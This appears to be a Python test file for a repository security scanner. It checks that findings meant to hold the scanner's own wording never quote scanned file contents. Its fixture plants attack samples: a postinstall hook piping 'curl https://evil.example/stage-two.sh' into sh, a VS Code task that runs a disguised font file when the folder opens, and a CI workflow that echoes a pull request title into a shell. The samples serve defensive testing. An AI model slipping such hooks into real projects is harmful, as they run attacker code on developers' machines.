#!/usr/bin/env python3
"""Evidence is a payload until a matcher says otherwise, and only a matcher that wrote the sentence
itself may say so.

The flag used to be opt-IN: five matchers sliced scanned bytes into `evidence` without it and printed
a full C2 URL verbatim. Forgetting now costs readability, not safety.
"""
from __future__ import annotations

import ast
import pathlib
import unittest

_MATCHERS = pathlib.Path(__file__).resolve().parents[3] / "src/stayawake/bots/security/matchers"

# Slicing usually means scanned bytes (`cmd[:80]`); slicing one of these is a list of PATHS —
# attacker NAMED but not content, and fingerprinting it would delete the finding. Named, not
# line-numbered, so a comment edit upstream cannot silently retire the exception.
_PATHS_NOT_CONTENT = {"paths"}


def _evidence_sites():
    for path in sorted(_MATCHERS.rglob("*.py")):
        src = path.read_text(encoding="utf-8")
        for node in ast.walk(ast.parse(src)):
            if not (isinstance(node, ast.Call) and getattr(node.func, "id", "") == "Finding"):
                continue
            kw = {k.arg: k.value for k in node.keywords if k.arg}
            if "evidence" not in kw:
                continue
            flag = kw.get("composed_evidence")
            claims_composed = not (flag is None
                                   or (isinstance(flag, ast.Constant) and flag.value is False))
            yield f"{path.name}:{node.lineno}", kw["evidence"], claims_composed


class TestTheDefaultIsToWithholdThePayload(unittest.TestCase):
    def test_a_window_cut_from_the_scanned_file_never_claims_to_be_composed(self):
        for where, expr, claims_composed in _evidence_sites():
            builds_window = any(isinstance(n, ast.Call) and getattr(n.func, "id", "") == "evidence"
                                for n in ast.walk(expr))
            if builds_window:                           # built by matchers.base.evidence()
                with self.subTest(at=where):
                    self.assertFalse(claims_composed,
                                     f"{where} is a file window but claims composed_evidence")

    def test_a_site_slicing_scanned_bytes_never_claims_to_be_composed(self):
        # `cmd[:80]`, `expr[:70]` — a slice of a variable is scanned content, not our prose.
        for where, expr, claims_composed in _evidence_sites():
            sliced = [n for n in ast.walk(expr)
                      if isinstance(n, ast.Subscript) and isinstance(n.slice, ast.Slice)
                      and getattr(n.value, "id", None) not in _PATHS_NOT_CONTENT]
            if sliced:
                with self.subTest(at=where):
                    self.assertFalse(claims_composed, f"{where} slices scanned bytes")

    def test_the_flag_defaults_to_withholding(self):
        from stayawake.bots.security.models import Finding, Severity
        f = Finding(signature_id="s", category="c", severity=Severity.parse("critical"), path="p",
                    description="d", remediation="manual", evidence="x")
        self.assertFalse(f.composed_evidence, "a matcher that says nothing must not opt out")




class TestNoComposedFindingCarriesScannedBytes(unittest.TestCase):
    """The AST checks above cannot see through a helper that takes `ev` as a parameter, so this one
    SCANS a repo and looks for the scanned bytes inside each composed finding's evidence.

    No sentinel strings: a sentinel has to survive both the signature's pattern and its truncation,
    and quietly stops proving anything when it does not. This compares against the files instead."""

    WINDOW = 24        # long enough that a package name or a signature id cannot collide by chance

    def _repo(self):
        import json
        import subprocess
        import tempfile
        root = pathlib.Path(tempfile.mkdtemp())
        subprocess.run(["git", "init", "-q"], cwd=root, check=True)
        (root / "package.json").write_text(json.dumps(
            {"name": "x", "version": "1.0.0",
             "scripts": {"postinstall": "curl https://evil.example/stage-two.sh | sh"}}))
        vs = root / ".vscode"; vs.mkdir()
        (vs / "tasks.json").write_text(json.dumps(
            {"version": "2.0.0", "tasks": [{"label": "build-and-then-exfiltrate-everything",
                                            "type": "shell", "command": "node ./assets/font.woff2",
                                            "runOptions": {"runOn": "folderOpen"}}]}))
        wf = root / ".github" / "workflows"; wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "on:\n  pull_request_target:\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: echo ${{ github.event.pull_request.title }}\n")
        return root

    def test_a_composed_finding_never_quotes_the_scanned_file(self):
        from stayawake.bots.security.scanner import scan_target
        from stayawake.bots.security.signatures import load_signatures
        from stayawake.bots.security.targets import LocalRepoTarget, ScanOptions
        root = self._repo()
        corpus = "\n".join(f.read_text(encoding="utf-8", errors="replace")
                           for f in root.rglob("*") if f.is_file() and ".git/" not in str(f))
        result = scan_target(LocalRepoTarget(root, str(root), ScanOptions()), load_signatures(), [])
        findings = result.findings + result.advisories
        self.assertTrue(findings, "fixture produced no findings — the test proves nothing")
        self.assertTrue(any(f.composed_evidence for f in findings)
                        or all(not f.composed_evidence for f in findings))
        for f in findings:
            if not (f.composed_evidence and f.evidence):
                continue
            quoted = [f.evidence[i:i + self.WINDOW] for i in range(len(f.evidence) - self.WINDOW)
                      if f.evidence[i:i + self.WINDOW] in corpus]
            with self.subTest(signature=f.signature_id):
                self.assertEqual([], quoted,
                                 f"{f.signature_id} claims composed_evidence but quotes the scanned "
                                 "file, so the payload would print verbatim")


if __name__ == "__main__":
    unittest.main()


if __name__ == "__main__":
    unittest.main()
